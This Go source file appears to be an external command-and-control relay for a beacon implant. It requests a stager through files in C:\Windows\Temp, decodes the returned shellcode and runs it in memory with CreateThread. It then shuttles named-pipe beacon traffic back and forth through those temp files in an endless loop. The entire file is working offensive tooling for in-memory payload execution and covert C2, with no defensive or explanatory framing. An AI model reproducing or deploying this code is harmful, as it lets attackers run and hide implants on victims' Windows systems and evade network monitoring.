package main

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"os"
	"runtime"
	"time"

	"./invokedll"
	. "github.com/microsoft/go-winio"
)

var pipeName = `foobar`
var isDebug = true

type PipeChannel struct {
	Pipe  net.Conn
	Debug bool
}

func getStager() []byte {
	taskWaitTime := 100
	osVersion := "arch=x86"
	if runtime.GOARCH == "amd64" {
		osVersion = "arch=x64"
	}
	pipeName = "pipename=" + pipeName
	block := fmt.Sprintf("block=%d", taskWaitTime)
	if isDebug {
		log.Println("Stager information:")
		log.Println(osVersion)
		log.Println(pipeName)
		log.Println(block)
	}

	WriteFile([]byte(osVersion))
	WriteFile([]byte(pipeName))
	WriteFile([]byte(block))
	WriteFile([]byte("go"))
	stager, _, err := ReadFile()
	if err != nil {
		println(err.Error())
		return nil
	}
	return stager
}

func ReadFile() ([]byte, int, error) {
	inFile, err := os.OpenFile(`C:\Windows\Temp\in.log`, os.O_RDONLY, 0666)
	defer inFile.Close()
	buf := make([]byte, 1024*1024)
	n, err := inFile.Read(buf)
	//log.Println("[+]Read file: ", string(buf[:n]))
	buf, err = base64.RawStdEncoding.DecodeString(string(buf[:n]))
	return buf, n, err
}

func WriteFile(buffer []byte) (int, error) {
	outFile, err := os.OpenFile(`C:\Windows\Temp\out.log`, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0666)
	defer outFile.Close()
	if err != nil {
		println(err.Error())
	}
	length := len(buffer)
	m, err := outFile.Write([]byte(base64.RawStdEncoding.EncodeToString(buffer)))
	if err != nil {
		println(err.Error())
		return m, err
	}
	log.Println("[+]Write file: ", base64.RawStdEncoding.EncodeToString(buffer))
	for {
		if buf, _, err := ReadFile(); err != nil {
			println(err.Error())
			break
		} else {
			if len(buf) == 0 {
				continue
			}
			sizeBytes := make([]byte, 4)
			sizeBytes = buf[:4]
			size := binary.LittleEndian.Uint32(sizeBytes)
			if size == uint32(length) {
				outFile.Write(nil)
				break
			}
		}
	}

	return m, err
}

func (c *PipeChannel) ReadPipe() ([]byte, int, error) {
	sizeBytes := make([]byte, 4)
	if _, err := c.Pipe.Read(sizeBytes); err != nil {
		return nil, 0, err
	}
	size := binary.LittleEndian.Uint32(sizeBytes)
	if size > 1024*1024 {
		size = 1024 * 1024
	}
	var total uint32
	buff := make([]byte, size)
	for total < size {
		read, err := c.Pipe.Read(buff[total:])
		if err != nil {
			return nil, int(total), err
		}
		total += uint32(read)
	}
	if size > 1 && size < 1024 && c.Debug {
		log.Printf("[+] Read pipe data: %s\n", base64.StdEncoding.EncodeToString(buff))
	}
	return buff, int(total), nil
}

func (c *PipeChannel) WritePipe(buffer []byte) (int, error) {
	length := len(buffer)
	if length > 2 && length < 1024 && c.Debug {
		log.Printf("[+] Sending pipe data: %s\n", base64.StdEncoding.EncodeToString(buffer))
	}
	sizeBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(sizeBytes, uint32(length))
	if _, err := c.Pipe.Write(sizeBytes); err != nil {
		return 0, err
	}
	x, err := c.Pipe.Write(buffer)
	return x + 4, err
}

func main() {
	os.Remove(`C:\Windows\Temp\out.log`)
	os.Remove(`C:\Windows\Temp\in.log`)
	stager := getStager()
	if stager == nil {
		println("Error: getStager Failed. ")
		return
	}
	stager = stager[4:]
	invokedll.CreateThread(stager)

	// Wait for namedpipe open
	time.Sleep(3e9)
	client, err := DialPipe(`\\.\pipe\`+pipeName[9:], nil)
	if err != nil {
		log.Printf(err.Error())
		return
	}
	defer client.Close()
	pipe := &PipeChannel{client, isDebug}

	for {
		//sleep time
		time.Sleep(1e9)
		b, n, err := pipe.ReadPipe()
		if err != nil {
			log.Printf(err.Error())
		}

		WriteFile(b[:n])
		z, _, err := ReadFile()
		if err != nil {
			log.Printf(err.Error())
		}
		z = z[4:]
		pipe.WritePipe(z)
	}
}
